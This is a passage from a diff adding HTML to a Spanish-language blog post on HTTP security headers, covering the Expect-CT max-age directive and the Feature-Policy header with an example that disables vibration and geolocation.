+          <td>La directiva de edad máxima especifica el número de segundos después de la recepción del campo de encabezado Expect-CT durante el cual el navegador debe considerar el host del que se recibió el mensaje como un host Expect-CT conocido</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="feature-policy">Feature-Policy</h2>
+<p>El encabezado Feature-Policy permite a los desarrolladores habilitar y deshabilitar selectivamente el uso de varias funciones del navegador y API.</p>
+<p><strong>Ejemplo:</strong></p>
+<p><code>Feature-Policy: vibrate 'none'; geolocation 'none'</code></p>
+<p><a href="https://w3c.github.io/webappsec-feature-policy/">https://w3c.github.io/webappsec-feature-policy/</a></p>
+<p>Hasta la próxima!!</p>
 
             </div>
         </article></main>
